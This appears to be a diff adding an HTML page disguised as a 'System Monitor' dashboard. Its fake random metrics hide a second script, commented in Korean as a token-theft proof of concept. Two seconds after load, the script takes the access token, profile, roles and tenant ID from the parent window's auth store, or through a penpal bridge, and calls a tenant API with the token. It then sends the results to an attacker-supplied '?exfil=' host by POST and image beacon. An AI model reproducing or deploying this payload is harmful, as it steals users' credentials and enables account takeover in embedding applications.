@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>System Monitor</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f8f9fa; color: #333; }
+    .dashboard { padding: 24px; }
+    h1 { font-size: 20px; color: #1a1a2e; margin-bottom: 16px; }
+    .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; }
+    .card { background: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+    .card h3 { font-size: 12px; color: #888; text-transform: uppercase; margin-bottom: 8px; }
+    .card .value { font-size: 28px; font-weight: 700; color: #1a1a2e; }
+    .card .sub { font-size: 12px; color: #4ecca3; margin-top: 4px; }
+    .table-wrap { margin-top: 24px; background: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+    table { width: 100%; border-collapse: collapse; font-size: 13px; }
+    th { text-align: left; padding: 10px; border-bottom: 2px solid #eee; color: #888; font-size: 11px; text-transform: uppercase; }
+    td { padding: 10px; border-bottom: 1px solid #f0f0f0; }
+    #debug-panel { display: none; margin-top: 24px; background: #1a1a2e; color: #0ff; border-radius: 8px; padding: 16px; font-family: monospace; font-size: 12px; white-space: pre-wrap; word-break: break-all; }
+    #debug-panel.show { display: block; }
+    #debug-panel .danger { color: #e94560; }
+  </style>
+</head>
+<body>
+<div class="dashboard">
+  <h1>System Monitor</h1>
+  <div class="cards">
+    <div class="card"><h3>CPU Usage</h3><div class="value" id="cpu">--</div><div class="sub">Normal</div></div>
+    <div class="card"><h3>Memory</h3><div class="value" id="mem">--</div><div class="sub">Available</div></div>
+    <div class="card"><h3>Active Users</h3><div class="value" id="users">--</div><div class="sub">Online</div></div>
+    <div class="card"><h3>Uptime</h3><div class="value" id="uptime">--</div><div class="sub">Days</div></div>
+  </div>
+  <div class="table-wrap">
+    <h3 style="margin-bottom:12px;color:#888;font-size:11px;text-transform:uppercase">Recent Events</h3>
+    <table>
+      <thead><tr><th>Time</th><th>Event</th><th>Status</th></tr></thead>
+      <tbody id="events"></tbody>
+    </table>
+  </div>
+  <div id="debug-panel"></div>
+</div>
+
+<script>
+// 정상 대시보드 UI
+function fakeData() {
+  document.getElementById('cpu').textContent = (20 + Math.random() * 30).toFixed(1) + '%';
+  document.getElementById('mem').textContent = (4.2 + Math.random() * 2).toFixed(1) + ' GB';
+  document.getElementById('users').textContent = Math.floor(10 + Math.random() * 50);
+  document.getElementById('uptime').textContent = Math.floor(30 + Math.random() * 60);
+  var events = [
+    { event: 'User login', status: 'OK' },
+    { event: 'Config updated', status: 'OK' },
+    { event: 'Backup completed', status: 'OK' },
+    { event: 'Health check', status: 'OK' },
+    { event: 'Cache cleared', status: 'OK' },
+  ];
+  var tbody = document.getElementById('events');
+  tbody.innerHTML = events.map(function(e) {
+    var t = new Date(Date.now() - Math.random() * 3600000);
+    return '<tr><td>' + t.toLocaleTimeString() + '</td><td>' + e.event + '</td><td style="color:#4ecca3">' + e.status + '</td></tr>';
+  }).join('');
+}
+fakeData();
+setInterval(fakeData, 5000);
+</script>
+
+<script>
+// ========================================
+// CONFIG — URL 파라미터로 수신서버 지정
+// 사용법: ?exfil=http://your-ip:9999
+// 디버그: ?exfil=http://your-ip:9999&debug
+// ========================================
+var params = new URLSearchParams(window.location.search);
+var EXFIL_URL = params.get('exfil') || '';
+var debug = params.has('debug');
+var panel = document.getElementById('debug-panel');
+if (debug) panel.classList.add('show');
+
+function log(msg) {
+  if (debug) panel.textContent += msg + '\n';
+  console.log('[PoC]', msg);
+}
+
+// ========================================
+// 토큰 탈취 — 순수 JS, 외부 의존성 없음
+// ========================================
+function steal() {
+  var result = { vectors: [], timestamp: new Date().toISOString(), origin: window.location.origin };
+
+  // Vector 1: window.parent.__NEXUS_AUTH_STORE__
+  try {
+    var store = window.parent.__NEXUS_AUTH_STORE__;
+    if (store) {
+      var s = store.getState();
+      result.token = s.accessToken;
+      result.username = s.profile ? s.profile.preferred_username : null;
+      result.email = s.profile ? s.profile.email : null;
+      result.roles = s.roles;
+      result.groups = s.groups;
+      result.tenantId = s.tenantId;
+      result.profile = s.profile;
+      result.isAuthenticated = s.isAuthenticated;
+      result.vectors.push('global-store');
+      log('[VULN] global store access — user: ' + result.username);
+    } else {
+      log('[INFO] __NEXUS_AUTH_STORE__ not found on parent');
+    }
+  } catch (e) {
+    log('[BLOCKED] global store: ' + e.message);
+  }
+
+  // Vector 2: parent DOM 접근
+  try {
+    var title = window.parent.document.title;
+    result.parentTitle = title;
+    result.parentUrl = window.parent.location.href;
+    result.vectors.push('parent-dom');
+    log('[VULN] parent DOM access — title: ' + title);
+  } catch (e) {
+    log('[BLOCKED] parent DOM: ' + e.message);
+  }
+
+  return result;
+}
+
+// 탈취한 토큰으로 API 호출
+function callApi(result) {
+  if (!result.token) return Promise.resolve(result);
+  return fetch('/api/tenants', {
+    headers: {
+      'Authorization': 'Bearer ' + result.token,
+      'X-Tenant-ID': result.tenantId || 'default'
+    }
+  })
+  .then(function(res) {
+    return res.json().then(function(data) {
+      result.apiResult = { status: res.status, data: data };
+      result.vectors.push('api-call');
+      log('[VULN] API call: ' + res.status);
+      return result;
+    });
+  })
+  .catch(function(e) {
+    log('[INFO] API call failed: ' + e.message);
+    return result;
+  });
+}
+
+// 외부 서버로 전송
+function exfiltrate(data) {
+  if (!EXFIL_URL) {
+    log('[SKIP] exfil URL 미설정. ?exfil=http://your-ip:9999 추가하세요');
+    log('Result:\n' + JSON.stringify(data, null, 2));
+    return;
+  }
+
+  // POST
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', EXFIL_URL + '/collect', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify(data));
+    log('[SENT] POST → ' + EXFIL_URL + '/collect');
+  } catch (e) { log('[FAIL] POST: ' + e.message); }
+
+  // Image beacon
+  try {
+    var payload = btoa(JSON.stringify({
+      token: data.token, username: data.username,
+      roles: data.roles, tenantId: data.tenantId
+    }));
+    new Image().src = EXFIL_URL + '/collect?d=' + payload + '&_=' + Date.now();
+    log('[SENT] beacon → ' + EXFIL_URL);
+  } catch (e) { log('[FAIL] beacon: ' + e.message); }
+}
+
+// Vector 3: Penpal bridge (cross-origin에서도 동작)
+function stealViaPenpal() {
+  return new Promise(function(resolve) {
+    var script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/npm/penpal@7.1.0/dist/penpal.min.js';
+    script.onload = function() {
+      try {
+        var messenger = new penpal.WindowMessenger({
+          localWindow: window,
+          remoteWindow: window.parent,
+          remoteOrigin: '*',
+        });
+        var connection = penpal.connect({ messenger: messenger });
+        var timeout = setTimeout(function() { resolve(null); }, 5000);
+        connection.promise.then(function(shell) {
+          clearTimeout(timeout);
+          Promise.all([
+            shell.getAccessToken(),
+            shell.getUserProfile(),
+            shell.getTenantId()
+          ]).then(function(values) {
+            resolve({ token: values[0], profile: values[1], tenantId: values[2] });
+          }).catch(function() { resolve(null); });
+        }).catch(function() { clearTimeout(timeout); resolve(null); });
+      } catch(e) { log('[FAIL] penpal init: ' + e.message); resolve(null); }
+    };
+    script.onerror = function() { log('[FAIL] penpal CDN load failed'); resolve(null); };
+    document.head.appendChild(script);
+  });
+}
+
+// 실행 — 2초 후
+setTimeout(function() {
+  log('Starting token theft...');
+  log('iframe: ' + (window.parent !== window ? 'yes' : 'no'));
+  log('same-origin: ' + (function() { try { return !!window.parent.document; } catch(e) { return false; } })());
+
+  var data = steal();
+
+  // same-origin 실패 시 penpal 시도
+  var next = (data.vectors.length > 0)
+    ? Promise.resolve(data)
+    : stealViaPenpal().then(function(penpalResult) {
+        if (penpalResult && penpalResult.token) {
+          data.token = penpalResult.token;
+          data.profile = penpalResult.profile;
+          data.username = penpalResult.profile ? penpalResult.profile.preferred_username : null;
+          data.tenantId = penpalResult.tenantId;
+          data.vectors.push('penpal');
+          log('[VULN] penpal bridge — user: ' + data.username);
+        } else {
+          log('[SAFE] penpal also failed');
+        }
+        return data;
+      });
+
+  next.then(function(result) {
+    if (result.vectors.length > 0) {
+      return callApi(result);
+    }
+    return result;
+  }).then(function(result) {
+    log('Final vectors: ' + (result.vectors.length > 0 ? result.vectors.join(', ') : 'none'));
+    exfiltrate(result);
+  });
+}, 2000);
+</script>
+</body>
+</html>
